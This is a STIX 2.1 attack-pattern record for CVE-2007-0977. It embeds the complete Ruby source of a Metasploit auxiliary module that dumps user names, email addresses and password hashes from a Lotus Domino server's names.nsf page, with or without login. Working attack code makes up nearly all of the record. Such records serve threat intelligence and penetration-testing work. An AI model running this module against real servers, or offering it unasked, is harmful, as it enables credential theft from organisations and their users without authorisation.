{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fd3c19cd-76a2-4a55-bdd1-179b7543a343",
    "created": "2024-08-14T16:27:12.658957Z",
    "modified": "2024-08-14T16:27:12.658961Z",
    "name": "Lotus Domino Password Hash Collector",
    "description": "Get users passwords hashes from names.nsf page",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/lotus/lotus_domino_hashes.rb",
            "external_id": "lotus_domino_hashes.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-0977"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Lotus Domino Password Hash Collector',\n      'Description'    => 'Get users passwords hashes from names.nsf page',\n      'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE' , '2007-0977']\n        ]\n    )\n\n  register_options(\n    [\n      OptString.new('NOTES_USER', [false, 'The username to authenticate as', '']),\n      OptString.new('NOTES_PASS', [false, 'The password for the specified username' ]),\n      OptString.new('URI', [false, 'Define the path to the names.nsf file', '/names.nsf'])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def run_host(ip)\n    user = datastore['NOTES_USER']\n    pass = datastore['NOTES_PASS']\n    @uri = normalize_uri(datastore['URI'])\n\n    if user.eql?('') && pass.eql?('')\n      print_status(\"#{peer} - Lotus Domino - Trying dump password hashes without credentials\")\n\n      begin\n        res = send_request_raw({\n          'method'  => 'GET',\n          'uri'     => \"#{@uri}\\/$defaultview?Readviewentries\",\n        }, 25)\n\n        if res.nil?\n          print_error('Connection failed')\n          return\n        end\n\n        if res && res.body.to_s =~ /\\<viewentries/\n          print_good(\"#{peer} - Lotus Domino - OK names.nsf accessible without credentials\")\n          cookie = ''\n          get_views(cookie, @uri)\n\n        elsif res && res.body.to_s =~ /names.nsf\\?Login/\n          print_error(\"#{peer} - Lotus Domino - The remote server requires authentication\")\n          return :abort\n\n        else\n          print_error(\"#{peer} - Lotus Domino - Unrecognized #{res.code} response\")\n          vprint_error(res.to_s)\n          return :abort\n\n        end\n\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      rescue ::Timeout::Error, ::Errno::EPIPE\n      end\n\n    else\n      print_status(\"#{peer} - Lotus Domino - Trying dump password hashes with given credentials\")\n      do_login(user, pass)\n    end\n  end\n\n  def do_login(user = nil, pass = nil)\n    post_data = \"username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=%2Fnames.nsf\"\n\n    begin\n\n      res = send_request_cgi({\n        'method'  => 'POST',\n        'uri'     => '/names.nsf?Login',\n        'data'    => post_data\n      }, 20)\n\n      if res.nil?\n        print_error(\"#{peer} - Connection timed out\")\n        return\n      end\n\n      if res && res.code == 302\n        if res.get_cookies =~ /DomAuthSessId=(.*);(.*)/i\n          cookie = \"DomAuthSessId=#{$1}\"\n        elsif res.get_cookies =~ /LtpaToken=(.*);(.*)/i\n          cookie = \"LtpaToken=#{$1}\"\n        else\n          print_error(\"#{peer} - Lotus Domino - Unrecognized 302 response\")\n          return :abort\n        end\n        print_good(\"#{peer} - Lotus Domino - SUCCESSFUL authentication for '#{user}'\")\n        print_status(\"#{peer} - Lotus Domino - Getting password hashes\")\n        get_views(cookie, @uri)\n\n      elsif res && res.body.to_s =~ /names.nsf\\?Login/\n        print_error(\"#{peer} - Lotus Domino - Authentication error: failed to login as '#{user}'\")\n        return :abort\n\n      else\n        print_error(\"#{peer} - Lotus Domino - Unrecognized #{res.code} response\")\n        return :abort\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\n\n  def get_views(cookie, uri)\n    begin\n      res = send_request_raw({\n        'method'  => 'GET',\n        'uri'     => \"#{uri}\\/$defaultview?Readviewentries\",\n        'cookie'  => cookie\n      }, 25)\n      if res && res.body\n        max = res.body.scan(/siblings=\\\"(.*)\\\"/).first.join\n\n        1.upto(max.to_i) do |i|\n          res = send_request_raw({\n            'method'  => 'GET',\n            'uri'     => \"#{uri}\\/$defaultview?Readviewentries&Start=#{i}\",\n            'cookie'  => cookie\n          }, 25)\n\n          view_id = res.body.scan(/unid=\"([^\\s]+)\"/)[0].join\n          dump_hashes(view_id, cookie, uri)\n        end\n\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\n\n  def dump_hashes(view_id, cookie, uri)\n    begin\n      res = send_request_raw({\n        'method'  => 'GET',\n        'uri'     => \"#{uri}\\/$defaultview/#{view_id}?OpenDocument\",\n        'cookie'  => cookie\n      }, 25)\n\n      if res && res.body\n        doc = res.get_html_document\n        short_name =  doc.xpath('//input[@name=\"ShortName\"]/@value').text\n        user_mail =  doc.xpath('//input[@name=\"InternetAddress\"]/@value').text\n        pass_hash = doc.xpath('//input[@name=\"$dspHTTPPassword\" or @name=\"dspHTTPPassword\"]/@value').first&.text\n\n        short_name = 'NULL' if short_name.to_s.strip.empty?\n        user_mail = 'NULL' if user_mail.to_s.strip.empty?\n        pass_hash = 'NULL' if pass_hash.to_s.strip.empty?\n\n        print_good(\"#{peer} - Lotus Domino - Account Found: #{short_name}, #{user_mail}, #{pass_hash}\")\n\n        if pass_hash != 'NULL'\n          domino_svc = report_service(\n            :host => rhost,\n            :port => rport,\n            :name => (ssl ? 'https' : 'http')\n          )\n          report_auth_info(\n            :host        => rhost,\n            :port        => rport,\n            :sname       => (ssl ? 'https' : 'http'),\n            :user        => short_name,\n            :pass        => pass_hash,\n            :ptype       => 'domino_hash',\n            :source_id   => domino_svc&.id,\n            :source_type => 'service',\n            :proof       => \"WEBAPP=\\\"Lotus Domino\\\", USER_MAIL=#{user_mail}, HASH=#{pass_hash}, VHOST=#{vhost}\",\n            :active      => true\n          )\n        end\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n"
}